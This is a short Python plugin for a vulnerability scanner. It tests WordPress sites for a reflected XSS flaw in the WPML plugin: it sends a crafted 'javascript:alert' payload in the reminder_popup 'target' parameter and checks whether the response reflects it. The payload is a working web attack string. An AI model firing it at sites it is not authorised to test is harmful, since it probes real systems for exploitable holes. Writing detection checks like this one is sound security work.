#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Wordpress WPML Reflected XSS(maybe sql injection or Deletion,too)
#url + /?icl_action=reminder_popup&target=javascript%3Aalert%28%2FHelloWorld!%2f%29%3b%2f%2f
#refer:https://www.bugscan.net/#!/x/21436

import  re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    payload = '/?icl_action=reminder_popup&target=javascript%3Aalert%28%2Fhello+how_are_you_range%2f%29%3b%2f%2f'
    verify_url = url + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if code == 200:
		if res.find('alert(/hello how_are_you_range/)') != -1:
			security_hole(verify_url + 'Wordpress WPML Reflected XSS')

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])